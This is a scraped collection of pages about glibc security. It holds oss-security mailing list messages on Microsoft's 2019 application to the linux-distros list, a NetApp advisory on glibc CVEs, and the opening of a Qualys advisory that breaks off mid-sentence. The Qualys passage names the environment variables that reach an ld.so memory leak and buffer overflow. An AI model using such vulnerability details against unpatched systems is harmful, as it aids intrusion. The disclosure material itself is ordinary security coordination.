>> >wouldn't substantially benefit from the additional time, often around
>> >7 days and sometimes up to 14 days, that list membership could give
>> >you).
>>
>> Microsoft has decades long history of addressing security issues via
>> MSRC (<https://www.microsoft.com/en-us/msrc>). While we are able to
>> quickly (<1-2 hours) create a build to address disclosed security
>> issues, we require extensive testing and validation before we make these
>> builds public. Being members of this mailing list would provide us the
>> additional time we need for extensive testing.
>
>It'd be helpful if you could directly address this part: "including some
>that had been handled on (linux-)distros, meaning that membership would
>have been relevant to you".  Without such examples yet, we'd have to be
>guessing whether the membership would have been relevant to you or not.
>
>Right now, the statistics at:
>
><https://oss-security.openwall.org/wiki/mailing-lists/distros/stats>
>
>only go until the end of 2018, so you'd be able to use them for examples
>dating back to 2018 and earlier.  We should ask Gentoo to update these
>statistics soon, perhaps for period until end of June 2019, which will
>be possible soon.

Sure! Issues on the stats page that would not have been reported to MSRC
but are relevant to us would include:

 - On the kernel side, issues such as CVE-2017-7533
  (<https://www.openwall.com/lists/oss-security/2017/08/03/2>) would be
  relevant for all our offerings.

 - Core libraries affect us as well, for example CVE-2017-1000408
   (<https://www.openwall.com/lists/oss-security/2017/12/11/4>). This
   would affect our Sphere and SaaS offerings, as well as probably make
   us run through them through test gauntlet for WSLv2.

 - Higher level Linux tools, such as the one in CVE-2018-14722
   (<https://www.openwall.com/lists/oss-security/2018/08/14/7>) affect
   mostly our IaaS offerings, but I expect that we'd again validate the
   rest of our offerings with the fix.

>> >4. Not be (only) downstream or a rebuild of another distro (or else we
>> >need convincing additional justification of how the list membership
>> >would enable you to release fixes sooner, presumably not relying on
>> >the upstream distro having released their fixes first?)
>>
>> None of our builds are based on an existing distribution. For few of
>> these workloads we have a very custom kernel and userspace (such as for
>> Azure Sphere), while some share a more conventional kernel/userspace
>> configuration.
>>
>> >5. Be a participant and preferably an active contributor in relevant
>> >public communities (most notably, if you're not watching for issues
>> >being made public on oss-security, which are a superset of those that
>> >had been handled on (linux-)distros, then there's no valid reason for
>> >you to be on (linux-)distros)
>>
>> We follow closely public discussions with regards to security issues
>> that would affect us. While there was only a minor contribution back to
>> these lists mostly as we did not have any value to add back.
>>
>> During past years I've reported multiple security issues which were
>> assigned CVEs.
>>
>> >6. Accept the list policy (see above)
>>
>> We accept the list's policy.
>>
>> >7. Be able and willing to contribute back (see above), preferably in
>> >specific ways announced in advance (so that you're responsible for a
>> >specific area and so that we know what to expect from which member),
>> >and demonstrate actual contributions once you've been a member for a
>> >while
>>
>> We understand this need and will be contributing back. Looking at the
>> list of vacant positions I can suggest the following, but I suspect that
>> existing list members will have better suggestions.
>>
>> Technical:
>>
>> 3. Review and/or test the proposed patches and point out potential
>> issues with them (such as incomplete fixes for the originally reported
>> issues, additional issues you might notice, and newly introduced bugs),
>> and inform the list of the work done even if no issues were encountered
>> - primary: Amazon, backup: vacant
>>
>> Administrative:
>>
>> 3. Evaluate if the issue (or one of the issues) is effectively already
>> public (e.g., a fix is committed upstream with a descriptive message)
>> or/and is low severity and thus the report (or its portion pertaining to
>> the issue) should be made public right away for one or both of these
>> reasons, get a few other list members to confirm this understanding, and
>> if there are no objections then communicate this strong preference to
>> the reporter - primary: CloudLinux, backup: vacant
>
>If Microsoft volunteers for these, I'd like that to be in "primary" role
>at least for the technical task of "3. Review and/or test the proposed
>patches ..."  I think Amazon hasn't been doing enough on that front,
>especially given the request to "inform the list of the work done even
>if no issues were encountered".  Given this request, if this were
>seriously worked on, I would have expected such reports from Amazon on
>almost every issue handled on linux-distros, but this wasn't the case.

Sure, we'd love to help with the list's pain points.

>I also would like a distro (maybe Microsoft) to volunteer for Technical:
>
>4. Check if related issues exist in the same piece of software (e.g.,
>same bug class common across the software, or other kinds of bugs exist
>in its problematic component), and inform the list either way
>
>and Administrative:
>
>4. Evaluate relevance to other parties such as the upstream, other
>affected distros (not present on the (sub-)list), and other Open Source
>projects, see if the report mentions notifying any of these, communicate
>your findings and possible concerns to the reporter and the list, and
>stay on top of the resulting discussion until a decision is made on who
>else to possibly notify (or not) and any such notifications are in fact
>made (with the reporter's approval)
>
>These are completely unclaimed now, but are much needed.
>
>For Technical "4. Check if related issues exist ...", we sometimes get
>some helpful for varying distros' package maintainers and such, but this
>is not consistent.  For example, recently Takashi Iwai of SUSE helped
>with Linux Marvell Wi-Fi driver issues - thanks! - but this is more of
>an exception than the rule.
>
>The lack of a volunteer distro for Administrative "4. Evaluate relevance
>to other parties ..." came up e.g. here:
>
>"Linux kernel: Bluetooth: two remote infoleaks (CVE-2019-3459, CVE-2019-3460)"
><https://www.openwall.com/lists/oss-security/2019/01/11/2>

This could be interesting for us. we already work closely with multiple
distros as part of our public IaaS offering, as well as my work
maintaining the stable tree means I interact often with many subsystem
maintainers. We could leverage that for this task.

I think that this task would also benefit from collaboration with MSRC,
where for example we could verify whether the Bluetooth issue you brought
up would affect Windows, and whether issues reported to MSRC also affect
Linux.

>> >8. Be able and willing to handle PGP-encrypted e-mail
>>
>> I am able and willing to handle PGP-encrypted e-mail.
>>
>> >9. Have someone already on the private list, or at least someone else
>> >who has been active on oss-security for years but is not affiliated
>> >with your distro nor your organization, vouch for at least one of the
>> >people requesting membership on behalf of your distro (then that one
>> >vouched-for person will be able to vouch for others on your team, in
>> >case you'd like multiple people subscribed)
>>
>> Greg Kroah-Hartman <gregkh@...uxfoundation.org> would vouch for me
>> (Sasha Levin <sashal@...nel.org>).
>
>Great.
>
>Let's discuss this further, and perhaps arrive at a decision in July.

Great! Sounds like a plan.

--
Thanks,
Sasha

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from security.netapp.com_1e5d5a0c_20250126_004328.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English


[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [February 2018 GNU C Library Vulnerabilities in NetApp Products](https://security.netapp.com/advisory/ntap-20190404-0003)

## February 2018 GNU C Library Vulnerabilities in NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close 

#### Subscribe to NTAP-20190404-0003 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20190404-0003 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close 

#### Unsubscribe from NTAP-20190404-0003 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20190404-0003 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20190404-0003
**Version:**
15.0

**Last updated:**
07/01/2022

**Status:**
Final.

**CVEs:** CVE-2017-1000408, CVE-2017-1000409, CVE-2018-6485, CVE-2018-6551, CVE-2018-1000001

Overview
#### Summary

Multiple NetApp products incorporate GNU C Library (glibc). Multiple 2.x versions of glibc are susceptible to vulnerabilities which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of these vulnerabilities could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2017-1000408](https://nvd.nist.gov/vuln/detail/CVE-2017-1000408) | 7.8 (HIGH) | CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2017-1000409](https://nvd.nist.gov/vuln/detail/CVE-2017-1000409) | 7.0 (HIGH) | CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2018-1000001](https://nvd.nist.gov/vuln/detail/CVE-2018-1000001) | 7.8 (HIGH) | CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| [CVE-2018-6485](https://nvd.nist.gov/vuln/detail/CVE-2018-6485) | 5.3 (MEDIUM) | CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L |
| [CVE-2018-6551](https://nvd.nist.gov/vuln/detail/CVE-2018-6551) | 5.3 (MEDIUM) | CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

Affected Products
#### Affected Products

* Brocade Fabric Operating System Firmware
* Data ONTAP Edge
* NetApp Cloud Backup (formerly AltaVault)
* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H300E/H500E/H700E/H410S
* NetApp HCI Baseboard Management Controller (BMC) - H410C
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire, Enterprise SDS & HCI Storage Node (Element Software)
* NetApp SteelStore Cloud Integrated Storage
* NetApp VASA Provider for Clustered Data ONTAP 6.x
* NetApp VASA Provider for Clustered Data ONTAP 9.7 and above
* SnapProtect
* Storage Replication Adapter for Clustered Data ONTAP for VMware vSphere 9.7 and above
* Storage Replication Adapter for Clustered Data ONTAP for Windows 7.2 and above
* Virtual Storage Console for VMware vSphere 9.7 and above

#### Products Not Affected

* 7-Mode Transition Tool
* ATTO FibreBridge - 6500N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ Unified Manager for VMware vSphere
* Brocade Network Advisor Software
* Cloud Manager
* Cluster Network Switch (NetApp CN1610)
* Clustered Data ONTAP
* Clustered Data ONTAP Antivirus Connector
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity OS Controller Software 8.x
* E-Series SANtricity Storage Manager
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element Plug-in for vCenter Server
* FAS/AFF BIOS
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* MetroCluster Tiebreaker for clustered Data ONTAP
* NetApp Cloud Backup OST Plug-in (formerly AltaVault OST Plug-in)
* NetApp Converged Systems Advisor Agent
* NetApp HCI Baseboard Management Controller (BMC) - H610C
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp HCI Baseboard Management Controller (BMC) - H615C
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp HCI Storage Nodes
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp SANtricity SMI-S Provider
* NetApp SMI-S Provider
* ONTAP Select Deploy administration utility
* OnCommand Insight
* OnCommand Workflow Automation
* Open Systems SnapVault Agent
* Service Processor
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapDrive for Unix
* SnapManager for Hyper-V
* SnapManager for Oracle
* SnapManager for SAP
* Storage Services Connector
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID9 (9.x and prior)
* System Manager 9.x
* Virtual Storage Console for VMware vSphere 6.x

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **Data ONTAP Edge** | Data ONTAP Edge has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2630722.html) for more information. |
| **Virtual Storage Console for VMware vSphere 9.7 and above** | <https://mysupport.netapp.com/site/products/all/details/vsc/downloads-tab/download/30048/9.7P2> |
| **Storage Replication Adapter for Clustered Data ONTAP for Windows 7.2 and above** | Storage Replication Adapter for Clustered Data ONTAP for Windows 7.2 and above has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2864760.html) for more information. |
| **NetApp SolidFire, Enterprise SDS & HCI Storage Node (Element Software)** | <https://mysupport.netapp.com/site/products/all/details/element-software/downloads-tab/download/62654/12.0> <https://mysupport.netapp.com/site/products/all/details/netapp-hci/downloads-tab/download/62542/1.8> |
| **NetApp SteelStore Cloud Integrated Storage** | NetApp SteelStore Cloud Integrated Storage has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2397079.html) for more information. |
| **NetApp SolidFire & HCI Management Node** | <https://mysupport.netapp.com/site/products/all/details/element-software/downloads-tab/download/62654/12.0> <https://mysupport.netapp.com/site/products/all/details/netapp-hci/downloads-tab/download/62542/1.8> |
| **NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H300E/H500E/H700E/H410S** | NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H300E/H500E/H700E/H410S has no plans to address this vulnerability. |
| **SnapProtect** | SnapProtect has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2426797.html) for more information. |
| **Brocade Fabric Operating System Firmware** | <https://www.broadcom.com/products/fibre-channel-networking/software/brocade-network-advisor> |
| **NetApp VASA Provider for Clustered Data ONTAP 6.x** | NetApp VASA Provider for Clustered Data ONTAP 6.x has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2843185.html) for more information. |
| **Storage Replication Adapter for Clustered Data ONTAP for VMware vSphere 9.7 and above** | <https://mysupport.netapp.com/site/products/all/details/vsc/downloads-tab/download/30048/9.7P2> |
| **NetApp HCI Baseboard Management Controller (BMC) - H410C** | <https://mysupport.netapp.com/site/products/all/details/netapp-hci/downloads-tab/download/62542/Compute_Firmware_Bundle> First included in Compute Firmware Bundle version 2.146.2-12.5.74. |
| **NetApp VASA Provider for Clustered Data ONTAP 9.7 and above** | <https://mysupport.netapp.com/site/products/all/details/vsc/downloads-tab/download/30048/9.7P2> |
| **NetApp Cloud Backup (formerly AltaVault)** | NetApp Cloud Backup (formerly AltaVault) has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2880179.html) for more information. |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20190404-0003>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20190404 | Initial Public Release |
| 2.0 | 20190531 | SnapProtect moved to Won't Fix status |
| 3.0 | 20190715 | Brocade Fabric Operating System Firmware moved to Affected Products |
| 4.0 | 20200324 | NetApp HCI Baseboard Management Controller (BMC) - H610C, NetApp HCI Baseboard Management Controller (BMC) - H610S and NetApp HCI Baseboard Management Controller (BMC) - H615C moved to Affected Products |
| 5.0 | 20200507 | NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H300E/H500E/H700E/H410S moved to Affected Products |
| 6.0 | 20200522 | NetApp SolidFire & HCI Management Node added to Software Versions and Fixes |
| 7.0 | 20200612 | NetApp SolidFire & HCI Storage Node (Element Software) moved to Products Not Affected |
| 8.0 | 20200709 | Brocade Fabric Operating System Firmware added to Software Versions and Fixes |
| 9.0 | 20200730 | NetApp HCI Baseboard Management Controller (BMC) - H410C moved to Affected Products |
| 10.0 | 20200901 | NetApp SteelStore Cloud Integrated Storage moved to Won't Fix status |
| 11.0 | 20200923 | After additional review NetApp HCI Baseboard Management Controller (BMC) - H610C, NetApp HCI Baseboard Management Controller (BMC) - H610S, and NetApp HCI Baseboard Management Controller (BMC) - H615C moved from Affected Products to Products Not Affected |
| 12.0 | 20210331 | NetApp VASA Provider for Clustered Data ONTAP 9.6 and above, Storage Replication Adapter for Clustered Data ONTAP for VMware vSphere 9.6 and above, and Virtual Storage Console for VMware vSphere 9.6 and above added to Software Versions and Fixes |
| 13.0 | 20211012 | NetApp HCI Baseboard Management Controller (BMC) - H410C and NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H300E/H500E/H700E/H410S moved to Won't Fix status |
| 14.0 | 20220106 | NetApp Cloud Backup (formerly AltaVault) moved to Won't Fix status, Final status |
| 15.0 | 20220701 | NetApp HCI Baseboard Management Controller (BMC) - H410C added to Software Versions and Fixes |

This document is provided solely for informational purposes. All information is based upon NetApps current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp.  2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

   NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from www.openwall.com_cec3959f_20250126_004328.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists  *for password cracking*](/wordlists/)+ [passwdqc  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt  *KDF & password hashing*](/yescrypt/)+ [yespower  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish  *password hashing*](/crypt/)+ [phpass  *ditto in PHP*](/phpass/)+ [tcb  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd  *port scan detector*](/scanlogd/)+ [popa3d  *tiny POP3 daemon*](/popa3d/)+ [blists  *web interface to mailing lists*](/blists/)+ [msulogin  *single user mode login*](/msulogin/)+ [php\_mt\_seed  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](../../../2019/06/29/1) [[<thread-prev]](1) [[thread-next>]](../../../2019/07/01/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20190628170812.GG11506@sasha-vm>
Date: Fri, 28 Jun 2019 13:08:12 -0400
From: Sasha Levin <sashal@...nel.org>
To: oss-security@...ts.openwall.com
Subject: Re: linux-distros membership application - Microsoft

On Fri, Jun 28, 2019 at 02:57:43PM +0200, Solar Designer wrote:
>On Thu, Jun 27, 2019 at 01:05:08PM -0400, Sasha Levin wrote:
>> security@k.o is not a disclosure list, but
>> rather just a way to pull in kernel folks to fix issues. Some (most?) of
>> the kernel bugs that get fixed don't go through that list to begin with.
>
>"Some (most?) of the kernel [security] bugs that get fixed don't go
>through" linux-distros as well.

True, but we care about more than just the kernel side of things.

>> The kernel's documentation with regards to security issues and
>> disclosure actually points to linux-distros:
>> <https://www.kernel.org/doc/Documentation/admin-guide/security-bugs.rst> .
>
>I'm not entirely happy with the wording used there, which currently is:
>
>---
>Fixes for sensitive bugs, such as those that might lead to privilege
>escalations, may need to be coordinated with the private
><linux-distros@...openwall.org> mailing list so that distribution vendors
>are well prepared to issue a fixed kernel upon public disclosure of the
>upstream fix. Distros will need some time to test the proposed patch and
>will generally request at least a few days of embargo, and vendor update
>publication prefers to happen Tuesday through Thursday. When appropriate,
>the security team can assist with this coordination, or the reporter can
>include linux-distros from the start. In this case, remember to prefix
>the email Subject line with "[vs]" as described in the linux-distros wiki:
><<http://oss-security.openwall.org/wiki/mailing-lists/distros#how-to-use-the-lists>>
>---
>
>This says that "Distros [...] will generally request at least a few days
>of embargo", but the actual policy of (linux-)distros is that the
>reporter must provide a tentative public disclosure date/time in their
>very first message.
>
>Also, this doesn't say that by disclosing something to (linux-)distros
>the reporter accepts the list's policy, and leaves actually reading that
>wiki page with the policy optional.
>
>I don't readily have suggested edits, but we should address these issues
>somehow.  Please feel free to suggest edits.

Can I suggest that we fork the discussion around security-bugs.rst to
LKML? I can suggest an initial patch to address your comments here but I
think that this is better handled on LKML.

>On a related note, this might not be representative, but I ran a Twitter
>poll on days of week for vulnerability disclosures:
>
><https://twitter.com/solardiz/status/923885360001757185>
>
>Poll: What days of week work best for you for public disclosure by
>others of vulnerabilities in software you (or your employer, etc.) use?
>
>23% No preference or Other
>33% Mon
>36% Tue, Wed, Thu
> 8% Fri, Sat, Sun
>
>164 votes
>
>12:13 PM - 27 Oct 2017
>
>As you can see, Mon fared really well - almost same as Tue, Wed, Thu
>combined, meaning that it might be _the_ preferred day of week for
>vulnerability disclosures.  So we probably shouldn't exclude Mondays.

My concern with Monday is timezones: we should do the math here, but I'd
like to avoid spilling over to Sunday (or very early Monday for that
matter) for some timezones.

>> To complicate your question further: the Linux usage on our cloud has
>> surpassed Windows, as a by-product of that MSRC has started receiving
>> security reports of issues with Linux code both from users and vendors.
>> It's also the case that issues that are common for Windows and Linux
>> (like those speculative hardware bugs) are shared with us via MSRC as
>> well.
>>
>> If you think that there's value in connecting between these 3
>> entities, I'd be happy to do so (maybe as part of a new task).
>
>I'm not sure.  The microarchitectural "bugs" would have been
>inappropriate to bring to the distros list earlier than in 14 days prior
>to their public disclosures, and I don't know if the public disclosure
>dates on those were specific enough to achieve that.  Maybe you know?

As far as I understand specific dates for the microarchitectural bugs
were set pretty late in the process.

It's not just the microarchitectural bugs I was referring to, we are
getting security reports from users about security bugs in various
distros and we end up circling back with relevant distros to patch them
up. A recent example would be:
[https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1834499](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1834499) where an
internal user has reported a kernel memory leak due to a missing patch
in Ubuntu.

>> >It'd be helpful if you could directly address this part: "including some
>> >that had been handled on (linux-)distros, meaning that membership would
>> >have been relevant to you".  Without such examples yet, we'd have to be
>> >guessing whether the membership would have been relevant to you or not.
>> >
>> >Right now, the statistics at:
>> >
>> ><https://oss-security.openwall.org/wiki/mailing-lists/distros/stats>
>> >
>> >only go until the end of 2018, so you'd be able to use them for examples
>> >dating back to 2018 and earlier.  We should ask Gentoo to update these
>> >statistics soon, perhaps for period until end of June 2019, which will
>> >be possible soon.
>>
>> Sure! Issues on the stats page that would not have been reported to MSRC
>> but are relevant to us would include:
>>
>> - On the kernel side, issues such as CVE-2017-7533
>>  (<https://www.openwall.com/lists/oss-security/2017/08/03/2>) would be
>>  relevant for all our offerings.
>>
>> - Core libraries affect us as well, for example CVE-2017-1000408
>>   (<https://www.openwall.com/lists/oss-security/2017/12/11/4>). This
>>   would affect our Sphere and SaaS offerings, as well as probably make
>>   us run through them through test gauntlet for WSLv2.
>>
>> - Higher level Linux tools, such as the one in CVE-2018-14722
>>   (<https://www.openwall.com/lists/oss-security/2018/08/14/7>) affect
>>   mostly our IaaS offerings, but I expect that we'd again validate the
>>   rest of our offerings with the fix.
>
>Thanks!  Ideally, you'd also demonstrate that Microsoft fixed those
>issues (where relevant) within days of their public disclosure (so that
>some days of advance notice would have made a difference).  Can you?
>
>Or are you merely pointing out the kind of issues that would have been
>relevant to you and presumably fixed promptly now, but were not relevant
>and thus were not fixed back then?  That's less than ideal if so.

Microsoft's history with Linux is a rather recent one. I can offer the
following examples if you're willing to give us a few months off of the
"1 year" requirement:

CVE-2018-1002105: <https://azure.microsoft.com/en-us/updates/aks-clusters-patched-for-kubernetes-vulnerability/>
CVE-2018-5391, CVE-2018-5390: <https://azure.microsoft.com/en-us/blog/security-bulletin-for-august-2018/>
CVE-2019-5736: <https://azure.microsoft.com/en-us/updates/iot-edge-fix-cve-2019-5736/>
CVE-2019-11477, CVE-2019-11478, CVE-2019-11479: <https://azure.microsoft.com/en-us/updates/security-advisory-on-linux-kernel-tcp-vulnerabilities-for-hdinsight-clusters/>

>> Sure, we'd love to help with the list's pain points.
>
>Great!
>
>> >The lack of a volunteer distro for Administrative "4. Evaluate relevance
>> >to other parties ..." came up e.g. here:
>> >
>> >"Linux kernel: Bluetooth: two remote infoleaks (CVE-2019-3459,
>> >CVE-2019-3460)"
>> ><https://www.openwall.com/lists/oss-security/2019/01/11/2>
>>
>> This could be interesting for us. we already work closely with multiple
>> distros as part of our public IaaS offering, as well as my work
>> maintaining the stable tree means I interact often with many subsystem
>> maintainers. We could leverage that for this task.
>>
>> I think that this task would also benefit from collaboration with MSRC,
>> where for example we could verify whether the Bluetooth issue you brought
>> up would affect Windows, and whether issues reported to MSRC also affect
>> Linux.
>
>If Microsoft joins for its Linux offerings (including Linux on top of
>Windows), then checking if the Linux issues also affect Windows (itself)
>would involve sharing beyond the need-to-know condition of
>(linux-)distros list policy, so isn't allowed by default.  It could
>still be done with explicit approval of the reporter, though, and I
>expect most people would give such approval if asked.

I'd love to develop a framework that would allow for sharing of reports
between linux-distros/security@.../MSRC given the explicit approval of
the reporter. I think that the current "silo" model is broken.

Microsoft in general, and MSRC in particular have proved during
Meltdown/Spectre that they are a trusted entity which can work well with
the open source community to advance our common goals.

--
Thanks,
Sasha

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_37bcc266_20250126_131222.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists  *for password cracking*](/wordlists/)+ [passwdqc  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt  *KDF & password hashing*](/yescrypt/)+ [yespower  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish  *password hashing*](/crypt/)+ [phpass  *ditto in PHP*](/phpass/)+ [tcb  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd  *port scan detector*](/scanlogd/)+ [popa3d  *tiny POP3 daemon*](/popa3d/)+ [blists  *web interface to mailing lists*](/blists/)+ [msulogin  *single user mode login*](/msulogin/)+ [php\_mt\_seed  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](3) [[next>]](../../../2017/12/12/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20171211191438.GA11125@localhost.localdomain>
Date: Mon, 11 Dec 2017 11:14:38 -0800
From: Qualys Security Advisory <qsa@...lys.com>
To: oss-security@...ts.openwall.com
Subject: Qualys Security Advisory - Buffer overflow in glibc's ld.so

Qualys Security Advisory

Buffer overflow in glibc's ld.so

========================================================================
Contents
========================================================================

Summary
Memory Leak
Buffer Overflow
Exploitation
Acknowledgments

========================================================================
Summary
========================================================================

We have discovered a memory leak and a buffer overflow in the dynamic
loader (ld.so) of the GNU C Library (glibc):

- the memory leak (CVE-2017-1000408) first appeared in glibc 2.1.1
  (released on May 24, 1999) and can be reached and amplified through
  the LD_HWCAP_MASK environment variable;

- the buffer overflow (CVE-2017-1000409) first appeared in glibc 2.5
  (released on September 29, 2006) and can be triggered through the
  LD_LIBRARY_PATH environment variable.

Further investigation showed that:

- the buffer overflow is not exploitable if
  /proc/sys/fs/protected_hardlinks is enabled (it is not enabled by
  default on vanilla Linux kernels, but most Linux distributions turn it
  on by default);

- the memory leak and the buffer overflow are not exploitable if the
  glibc is patched against CVE-2017-1000366, because this patch ignores
